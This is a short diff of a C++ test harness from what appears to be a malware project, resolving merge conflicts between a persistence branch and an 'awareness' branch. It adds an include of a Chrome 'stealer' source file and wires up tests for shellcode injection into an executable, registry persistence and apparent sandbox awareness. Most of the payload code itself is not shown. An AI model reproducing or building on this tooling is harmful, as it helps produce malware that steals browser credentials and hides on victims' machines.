@@ -2,6 +2,7 @@
 #include "aes_gcm.h"
 #include "http.h"
 #include "inject.h"
+#include "../stealer/chrome.cpp"
 #include <iostream>
 #include <fstream>
 
@@ -108,7 +109,6 @@ void test_inject()
     std::cout << inject(exePath, shellcode, response.size()) << std::endl;
 }
 
-<<<<<<< HEAD
 void test_persistence()
 {
     // LPTSTR pwd;
@@ -149,7 +149,6 @@ void test_persistence()
     RegCloseKey(hKey);
 }
 
-=======
 void test_aware()
 {
     // std::string buf;
@@ -207,7 +206,7 @@ void test_aware()
     // return buf;
 
 }
->>>>>>> awareness
+
 
 int main(int argc, char* argv[])
 {   
@@ -226,13 +225,10 @@ int main(int argc, char* argv[])
         test_http();
     } else if (test_name == "inject") {
         test_inject();
-<<<<<<< HEAD
     } else if (test_name == "persistence") {
         test_persistence();
-=======
     } else if (test_name == "aware") {
         test_aware();
->>>>>>> awareness
     } else {
         std::cout << "test name invalid" << std::endl;
     }
